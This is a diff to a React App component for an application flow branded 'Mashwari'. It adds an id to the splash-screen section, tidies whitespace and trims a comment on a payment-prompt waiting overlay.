-      <section className={`view ${view === 'splash' ? 'active' : ''}`} onClick={() => { if(!splashDone) { setSplashDone(true); setView('step1'); } }}>
+      {/* SPLASH — FIXED: added id="splash" so #splash CSS rules apply */}
+      <section
+        id="splash"
+        className={`view ${view === 'splash' ? 'active' : ''}`}
+        onClick={() => { if (!splashDone) { setSplashDone(true); setView('step1'); } }}
+      >
         <div className="stage">
           <div className="logo" role="img" aria-label="Mashwari">
             <img className="g" style={{ left: '0%', width: '21.169%' }} src={IMG_1} alt="" />
@@ -267,7 +307,7 @@ export default function App() {
       </section>
 
       <div style={{ display: view !== 'splash' ? 'block' : 'none' }}>
-        
+
         {/* STEP 1 */}
         <section className={`view ${view === 'step1' ? 'active' : ''}`}>
           <h1>Complete your application</h1>
@@ -526,7 +566,7 @@ export default function App() {
         </div>
       )}
 
-      {/* STK WAITING OVERLAY (UPDATED WITH TIMELAPSE) */}
+      {/* STK WAITING OVERLAY */}
       {showStkOverlay && (
         <div className="stk-overlay show">
           <div className="ring"></div>
